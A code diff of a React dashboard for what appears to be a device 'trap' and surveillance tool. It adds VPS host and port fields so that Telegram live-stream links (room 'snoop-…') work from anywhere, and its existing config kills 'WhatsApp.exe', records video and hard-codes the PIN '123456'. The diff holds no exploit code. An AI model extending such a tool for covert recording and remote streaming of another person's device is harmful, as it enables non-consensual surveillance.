@@ -31,6 +31,8 @@ export const Dashboard: FC<DashboardProps> = ({ onTriggerTrap, logs }) => {
     targetKillProcess: 'WhatsApp.exe',
     videoRecordDurationSeconds: 30,
     emergencyMasterPin: '123456',
+    streamServerHost: '',
+    streamServerPort: '8080',
     streamRelayServerUrl: '',
   });
 
@@ -376,25 +378,58 @@ export const Dashboard: FC<DashboardProps> = ({ onTriggerTrap, logs }) => {
                 </div>
               </div>
 
-              <div className="space-y-1">
-                <label className="text-xs text-[#8F8F8F]">
-                  PUBLIC RELAY SERVER URL / VPS (OPTIONAL)
-                </label>
-                <input
-                  type="text"
-                  placeholder="e.g. http://103.123.45.67:8080 or https://stream.domain.com"
-                  value={config.streamRelayServerUrl || ''}
-                  onChange={(e) =>
-                    setConfig({
-                      ...config,
-                      streamRelayServerUrl: e.target.value.trim(),
-                    })
-                  }
-                  className="w-full bg-[#050505] border border-[#333] p-3 text-xs text-white focus:border-[#FF003C] focus:outline-none"
-                />
-                <div className="text-[10px] text-[#8F8F8F]">
-                  Alamat IP/Domain VPS Anda. Jika diisi, link live stream Telegram dapat dibuka dari mana saja (termasuk kuota 4G HP di luar rumah). Jika dikosongkan, menggunakan IP Wi-Fi lokal.
+              {/* Remote Surveillance VPS Server Settings */}
+              <div className="p-3 border border-[#222] bg-[#0c0c0c] space-y-3">
+                <div className="flex items-center justify-between">
+                  <span className="text-xs font-semibold text-white tracking-wider">
+                    VPS / RELAY SERVER FOR GLOBAL STREAMING (OPTIONAL)
+                  </span>
+                  <span className="text-[10px] text-[#00FF41] bg-[#112211] px-2 py-0.5 border border-[#224422]">
+                    DOCKER STREAM RELAY
+                  </span>
                 </div>
+                
+                <div className="grid grid-cols-3 gap-2">
+                  <div className="col-span-2 space-y-1">
+                    <label className="text-[11px] text-[#8F8F8F]">SERVER IP / HOST</label>
+                    <input
+                      type="text"
+                      placeholder="e.g. 103.123.45.67 or vps.domain.com"
+                      value={config.streamServerHost || ''}
+                      onChange={(e) =>
+                        setConfig({
+                          ...config,
+                          streamServerHost: e.target.value.trim(),
+                        })
+                      }
+                      className="w-full bg-[#050505] border border-[#333] p-2.5 text-xs text-white focus:border-[#FF003C] focus:outline-none"
+                    />
+                  </div>
+                  <div className="col-span-1 space-y-1">
+                    <label className="text-[11px] text-[#8F8F8F]">PORT</label>
+                    <input
+                      type="text"
+                      placeholder="8080"
+                      value={config.streamServerPort || ''}
+                      onChange={(e) =>
+                        setConfig({
+                          ...config,
+                          streamServerPort: e.target.value.trim(),
+                        })
+                      }
+                      className="w-full bg-[#050505] border border-[#333] p-2.5 text-xs text-white focus:border-[#FF003C] focus:outline-none"
+                    />
+                  </div>
+                </div>
+
+                <div className="text-[10px] text-[#8F8F8F]">
+                  Masukkan IP dan Port VPS Anda yang menjalankan relay Docker. Tautan live streaming di Telegram akan otomatis menggunakan IP ini sehingga bisa diakses dari mana saja via internet. Kosongkan jika ingin memakai jaringan Wi-Fi lokal.
+                </div>
+                {config.streamServerHost && (
+                  <div className="text-[10px] text-[#00FF41] font-mono bg-[#050505] p-2 border border-[#222]">
+                    Stream Endpoint: http://{config.streamServerHost.replace(/^https?:\/\//, '')}:{config.streamServerPort || '8080'}/stream?room=snoop-XXXXXX
+                  </div>
+                )}
               </div>
 
               <div className="space-y-1">
